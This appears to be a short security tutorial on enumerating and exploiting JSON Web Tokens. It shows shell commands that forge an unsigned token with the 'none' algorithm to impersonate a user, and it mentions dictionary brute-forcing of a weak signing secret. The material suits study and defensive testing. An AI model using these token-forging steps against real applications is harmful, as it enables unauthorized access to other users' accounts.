*Json Web Tokens (JWT)* are a type of token used for user *authentication* and *authorization* in web applications. JWT is an open standard (*RFC 7519*) that defines a compact and secure format to reliably transmit information between different parties.

Regarding the enumeration and exploitation phase of a JWT, this occurs when an attacker is able to obtain information about the JWTs used in the application, which could allow the attacker to exploit weaknesses in the authentication and authorization of the application.

JWT enumeration occurs when an attacker uses brute force techniques or some reverse engineering to obtain information about the JWTs used by the web application. For example, the attacker might try to guess the values of the JWTs by constructing *fake tokens*, trying to validate at all times whether the web application accepts them or not. If the attacker succeeds in enumerating a valid JWT, he could obtain sensitive information, such as usernames, passwords, user roles and other authentication and authorization data.

JWT exploitation occurs when an attacker uses the information obtained from JWT enumeration to exploit weaknesses in the application. For example, if the web application uses JWTs for authentication, but does not properly validate the JWT *signature*, an attacker could forge the token and access the web application as if it were a legitimate user.

To prevent JWT enumeration and exploitation, it is important to use secure web development practices, such as proper validation of input requests, secure management of JWT signing keys, and limiting the expiration time of JWTs.

----
>  With the website [jwt.io](https://jwt.io/) we can check and manipulate the *JWTs*.
----

 This is an example from *JWT*:
 
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlciI6Imxva2kifQ.bAAK2dV22bEskWifS2T9Uxx4_tFK1HbcWOVSs-5sdIk

# Header: algorithm and token type encoded in base64
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

# Payload: data encoded in base64
eyJpZCI6MiwidXNlciI6Imxva2kifQ

# Verify signature
bAAK2dV22bEskWifS2T9Uxx4_tFK1HbcWOVSs-5sdIk
```

Sometimes some *JWTs* accept *None* as an *algorithm* so the *signature* part is *not necessary*.

To generate a new *JWT* with *None* as algorithm we can do it from the console:

```bash
# Header
echo -n '{"alg": "NONE", "typ": "JWT"}' | base64

# Header result
eyJhbGciOiAiTk9ORSIsICJ0eXAiOiAiSldUIn0=

# Payload
echo -n '{"id": 2, "user": "loki"}' | base64

# Payload result
eyJpZCI6IDIsICJ1c2VyIjogImxva2kifQ==
```

----
> Before continuing we must omit the *equal* symbols and the *spaces* at the end of the generated *base64* strings.
----

Now we can join the *header* and the *payload* separated by *dots* and if the *JWT* supports *None* as algorithm, it will allow us to modify values such as the *id* and generate new valid *JWTs* without the need of *verification*:

```
eyJhbGciOiAiTk9ORSIsICJ0eXAiOiAiSldUIn0.eyJpZCI6IDIsICJ1c2VyIjogImxva2kifQ.
```

However, even if there is an *algorithm* and if it is *weak* (in this case *mySecret*) we can try to break it with *brute force* with a typical dictionary.